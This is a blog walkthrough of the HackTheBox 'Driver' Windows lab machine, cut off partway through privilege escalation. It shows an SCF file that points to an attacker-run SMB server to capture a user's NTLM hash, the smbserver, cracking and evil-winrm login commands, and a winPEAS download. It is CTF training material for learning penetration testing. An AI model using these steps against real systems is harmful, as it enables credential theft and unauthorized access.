---
title: Driver HackTheBox Walkthrough
url: https://www.hackingarticles.in/driver-hackthebox-walkthrough/
source: Hacking Articles
date: 2022-12-15
fetch_date: 2025-10-04T01:30:59.175453
---

# Driver HackTheBox Walkthrough

[Skip to content](#content)

Hacking Articles

## Recent Posts

* [AWS: IAM CreateLoginProfile Abuse](https://www.hackingarticles.in/aws-iam-createloginprofile-abuse/)
* [Privacy Protection: Encrypted DNS](https://www.hackingarticles.in/privacy-protection-encrypted-dns/)
* [Privacy Protection: Windows Privacy](https://www.hackingarticles.in/privacy-protection-windows-privacy/)
* [Privacy Protection: Browsers](https://www.hackingarticles.in/privacy-protection-browsers/)
* [Privacy Protection: Password Manager](https://www.hackingarticles.in/privacy-protection-password-manager/)

## Most Used Categories

* [CTF Challenges](https://www.hackingarticles.in/category/ctf-challenges/) (504)
  + [VulnHub](https://www.hackingarticles.in/category/ctf-challenges/vulnhub/) (311)
  + [HackTheBox](https://www.hackingarticles.in/category/ctf-challenges/hackthebox/) (164)
* [Penetration Testing](https://www.hackingarticles.in/category/penetration-testing/) (408)
* [Red Teaming](https://www.hackingarticles.in/category/red-teaming/) (126)
* [Website Hacking](https://www.hackingarticles.in/category/website-hacking/) (64)
* [Cyber Forensics](https://www.hackingarticles.in/category/cyber-forensics-tricks/) (68)
* [Privilege Escalation](https://www.hackingarticles.in/category/privilege-escalation/) (59)
* [Hacking Tools](https://www.hackingarticles.in/category/collection-of-hacking-tools/) (33)
* [Pentest Lab Setup](https://www.hackingarticles.in/category/pentest-lab-setup/) (29)

# [Hacking Articles](https://www.hackingarticles.in/)

Raj Chandel’s Blog

Search for:

Menu

* [Courses We Offer](https://www.hackingarticles.in/courses-we-offer/)
* [CTF Challenges](https://www.hackingarticles.in/ctf-challenges-walkthrough/)
* [Penetration Testing](https://www.hackingarticles.in/penetration-testing/)
* [Web Penetration Testing](https://www.hackingarticles.in/web-penetration-testing/)
* [Red Teaming](https://www.hackingarticles.in/red-teaming/)
* [Donate us](https://www.hackingarticles.in/donate-us/)

* [Home](https://www.hackingarticles.in/)
»* [CTF Challenges](https://www.hackingarticles.in/category/ctf-challenges/)
»* [Driver HackTheBox Walkthrough](https://www.hackingarticles.in/driver-hackthebox-walkthrough/)
»

[CTF Challenges](https://www.hackingarticles.in/category/ctf-challenges/), [HackTheBox](https://www.hackingarticles.in/category/ctf-challenges/hackthebox/)

# Driver HackTheBox Walkthrough

[December 14, 2022June 19, 2025](https://www.hackingarticles.in/driver-hackthebox-walkthrough/) by [Raj](https://www.hackingarticles.in/author/raj/)

The driver is an easy-rated Windows box on the HackTheBox platform. This is designed to understand initial exploitation using an SCF file and further escalate privileges locally using PrintNightmare (printer driver vulnerability). The box covers the fundamentals of enumeration and points to attention to detail while pentesting.

### Table of Content

**Initial Access**

* Enumeration using Nmap and other tools
* Compromising low-priv hash using SCF file
* Evil-WinRM to access low-priv account
* User Flag

**Privilege Escalation**

* Abusing printer driver vulnerability
* Root flag

Let’s deep dive into this.

### Initial Access

The IP address assigned to the machine is 10.129.32.68. Upon running an Nmap scan on this, we get the following result

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfnLCbTcD0oJ02BSoqk9zHokEpAau71lWylEVZw7RlzVtWKMO9URB3F670Mkyb-WwiEO--UV-kK3si7sZ33cwT2aOaSCklF9VEMyTQ1Snl_bryXPMc2Yujylq-19PgXmPul32W25lDRxrsl7ESsKINLwWbObgKOiaJYeWikY2Ij9ms6_-Lo6VHG1p95A/s16000/1.png)

We check each port for enumeration and further access. Only port 80 seemed to have a gateway which could lead further. But it was bound by a password.

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg1IfgkDJCWPCJd2xP7LqBZhDygYob2hBeYXHJjsCixGdiCnmKMXjN4K_eB9oEP4sMP-Jgwdxpk2A7c7Y0gcl91pYP3M4vu886BPvLU6PQoG-SOFMds7njLRVKVMyQeiXFtzdSEN6YCezMD3Dna6ZwfqfL1WAq3-2GurUrDlk7HyA2Y9oKWQhy7esiA_g/s16000/2.png)

But knowing the password is essential. We see in nmap results that an MFP printer website is running on this port. By operating under the assumption that websites for hardware products generally have a default password set, we try admin/admin and it worked!

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQWNeSNLGCxlyfrVGJemyTha0ADPfRytW6TZwN3cOJNq5xc1Pzd-hvhMRlMktBLmV98zsCPFqIAPMBqOFhLvpIclwkLm9X96otr74ppFxtQBvuBTv_R7YBaG4zd6KUkRs-pKRmOIVASR7OhIPvnqmEHAJfZrtedwY2SIdkRY2hMg_nTJVT-bIt_Tes5Q/s16000/3.1.png)

Further, we see there’s a firmware update option on the website which takes in a file. We looked for firmware files and how shells could be injected into them for execution. A far simpler method came up by which we could inject a Shell Command File (SCF) into the updated portal. You can read more about SCF **[here](https://www.ibm.com/docs/en/aix/7.1?topic=concepts-creating-running-shell-script)**. In Nmap, we see that a Windows server was running so the server could successfully run an SCF file.

We simply created an SMB server and used a UNC path to access it in order to catch the current running user’s hash.

```
cat shell.scf
[Shell]
Command=2
IconFile=\\10.10.14.93\tools\ignite.ico
[Taskbar]
Command=ToggleDesktop
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivpengmmVEFbebfMlG_XSDqmgJSnOSIm1sY_2MoS7JH2biUD52J0NpALdmSEGp91rLE7u3Xd52HUiz3co21yl6VMsM0dC2C5jbU7ylVSNVeYZ1iMMl7-H0GAa89d_fPv6T-iHP1zod16t5GqzO7BCVjasZqodsdpxjBIeFaRu0MvKxdwpmw3ox_TvYUw/s16000/3.png)

Further, we just upload this to the Firmware Updates section.

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiwyWZo7mAuPFBlHLmG3MvcCZELGEwZJjFVcHE8SQM4Y_NuOFur11-t8zMVaquJQr3D307gPKtIQlhG82q7DoS0ueHkL9x1sIZuPouyC2Bx4IKJPnOVWWFn0Mu5Na6xnkWj3R_qowtCCTPDJ4s4Zp5RG6ZZJdbCoUHIlr6GVbyoR1HlDWWVIAAW9EPfIw/s16000/3.2.png)

Before hitting submit, we launch our smbserver using the impacket tool suite. And then upon hitting submit, we see the Windows server ran the file and we captured a low-priv user tony’s hash.

```
smbserver.py tools $(pwd) -smb2support
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgYeeVwIgzdEuLLq6EvK4uaAND6lyZ5RpZ43BiWcSnGj5plfLaHiI-U3q6z86mTotv3XcwWMn-yd-yy9ou3IICWIaycwSM60CevYfkaqAhn5y6CIQCJqg6BC4d6MoBo7aUKnPK3BiRycwspiXJkwnNCYKzaOE3LuH8CCAwPcm89UkYxBqJD8hDPq9Tg1g/s16000/5.png)

We save this hash into a file and then run john the ripper using the rockyou dictionary file. We see a cracked credential “liltony”

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjuKPCUMQtqotukioDpRZZFcu5o85o7gtRWm5l6BUG8Uk1f-IZGUI5ied9JaNWa978YS1KZB1StZmZDy9HJL7DPFmYfFlWqtaymMDhxnxB14hrzgFKSs3RRcMPD0sMfrfpQ92i4q1cEDJA4aRvb3rT6d2ePoTaLm_aEEvUxHIyvCrkgScxursek_rPhSA/s16000/6.png)

Next, we tried using SMB tools to access the shell to the server but it didn’t work. In Nmap we see WinRM running so we tried evil-winrm to access tony’s account. You can install evil-winrm using gem. Then we access user.txt on Desktop.

```
gem install evil-winrm
evil-winrm -i 10.129.32.68 -u tony -p liltony
cd ..\Desktop
cat user.txt
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhw_ZhBoyPp8lK6AmDRpK9FHMie6XYP630K_M3FqXaONwW8sjGM417mBbzvRv1hNTPOdWJ5bOTvh2dDrxIiGXtYPhu0m2v3Tjoab0XSwW9NxthF56S7IHHxww2V3UrFglCtouOgUiSQhETqXlQ5frr-GkhDt7dKOWlwEyQjh-egNMEdc8FRwwsMPniTLA/s16000/7.png)

### Privilege Escalation

To enumerate further for privilege escalation, we use winPEASx64.exe. We can download this using wget.

```
wget https://github.com/carlospolop/peass-ng/releases/download/20221006/winpeasx64.exe
```

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgvi4oU_yxr59ZtjERx49jWO0lHlPFPZ9yHh1sadB0CTco5KzQxAp3nA7pALBLkA8_VsA-kU1DDThtL8zgMEHcUc0GUHmL7z6xpATG2Px8vWnlhQjn_VvTjm15gxfu40K3UpIufrBJx1F3xkuOFw4Iff4S5pbpiD_0YXSru4BwWLPUjQPBlt7xnC62kBw/s16000/8.png)

We can use the upload feature in evil-winrm to put this file on our box and then run it.

```
upload /root/winpeasx64....